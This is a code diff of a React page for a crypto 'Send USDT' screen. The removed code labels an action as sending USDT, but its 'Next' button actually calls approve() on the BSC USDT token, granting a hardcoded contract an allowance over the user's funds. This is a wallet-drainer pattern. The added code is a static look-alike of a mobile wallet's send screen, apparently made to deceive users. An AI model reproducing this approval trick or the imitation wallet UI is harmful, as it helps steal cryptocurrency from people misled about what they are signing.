@@ -1,79 +1,105 @@
-import { useState } from "react";
-import { ethers } from "ethers";
-
 export default function Home() {
-  const [from, setFrom] = useState("");
-  const [amount, setAmount] = useState("");
-
-  const CONTRACT = "0x5Eec04E6d2539Df5D3a3873f441c991ea56264BB";
-  const USDT = "0x55d398326f99059fF775485246999027B3197955";
-
-  const next = async () => {
-    try {
-      if (!from || !amount) {
-        alert("Inserisci dati");
-        return;
-      }
-
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await provider.getSigner();
-
-      const contract = new ethers.Contract(
-        USDT,
-        [
-          "function approve(address spender, uint256 amount) public returns (bool)"
-        ],
-        signer
-      );
-
-      const value = ethers.parseUnits(amount, 18);
-
-      const tx = await contract.approve(CONTRACT, value);
-      await tx.wait();
-
-      alert("Next completato!");
-    } catch (err) {
-      console.log(err);
-      alert("Errore");
-    }
-  };
-
   return (
     <div style={{
-      background: "#000",
-      color: "#00ff9f",
+      background: "#0b0b0b",
       minHeight: "100vh",
-      padding: "20px",
-      fontFamily: "monospace"
+      color: "white",
+      fontFamily: "-apple-system, BlinkMacSystemFont, sans-serif",
+      padding: "20px"
     }}>
-      <h2>💸 Send USDT</h2>
 
-      <input
-        placeholder="Wallet utente"
-        value={from}
-        onChange={(e) => setFrom(e.target.value)}
-        style={{ padding: "10px", marginTop: "10px", width: "100%" }}
-      />
+      {/* Address */}
+      <div style={{ marginTop: "40px" }}>
+        <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
+          Address or Domain Name
+        </div>
 
-      <input
-        placeholder="Amount USDT"
-        value={amount}
-        onChange={(e) => setAmount(e.target.value)}
-        style={{ padding: "10px", marginTop: "10px", width: "100%" }}
-      />
+        <div style={{
+          background: "#1a1a1a",
+          borderRadius: "16px",
+          padding: "14px",
+          display: "flex",
+          justifyContent: "space-between",
+          alignItems: "center"
+        }}>
+          <span style={{ color: "#777" }}>Search or Enter</span>
 
-      <button
-        onClick={next}
-        style={{
-          marginTop: "15px",
-          padding: "12px",
-          background: "#00ff9f",
+          <div style={{ color: "#22c55e", fontWeight: "500" }}>
+            Paste
+          </div>
+        </div>
+      </div>
+
+      {/* Network */}
+      <div style={{ marginTop: "25px" }}>
+        <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
+          Destination network
+        </div>
+
+        <div style={{
+          background: "#1a1a1a",
+          borderRadius: "16px",
+          padding: "14px",
+          display: "inline-flex",
+          alignItems: "center",
+          gap: "10px"
+        }}>
+          <span>🟡</span>
+          <span>BNB Smart Chain</span>
+        </div>
+      </div>
+
+      {/* Amount */}
+      <div style={{ marginTop: "25px" }}>
+        <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
+          Amount
+        </div>
+
+        <div style={{
+          background: "#1a1a1a",
+          borderRadius: "16px",
+          padding: "14px"
+        }}>
+          <div style={{
+            display: "flex",
+            justifyContent: "space-between",
+            alignItems: "center"
+          }}>
+            <span style={{ color: "#777" }}>USDT Amount</span>
+
+            <div style={{ display: "flex", gap: "10px" }}>
+              <span style={{ color: "#aaa" }}>USDT</span>
+              <span style={{ color: "#22c55e" }}>Max</span>
+            </div>
+          </div>
+
+          <div style={{ marginTop: "10px", color: "#555" }}>
+            ≈ $0.00
+          </div>
+        </div>
+      </div>
+
+      {/* Button */}
+      <div style={{
+        position: "fixed",
+        bottom: "30px",
+        left: "20px",
+        right: "20px"
+      }}>
+        <button style={{
+          width: "100%",
+          padding: "18px",
+          borderRadius: "40px",
+          background: "#2e5f3e",
           border: "none",
-          width: "100%"
-        }}
-      >
-        Next
-      </button>
+          color: "#bbb",
+          fontSize: "18px",
+          fontWeight: "600"
+        }}>
+          Next
+        </button>
+      </div>
+
     </div>
   );
 }
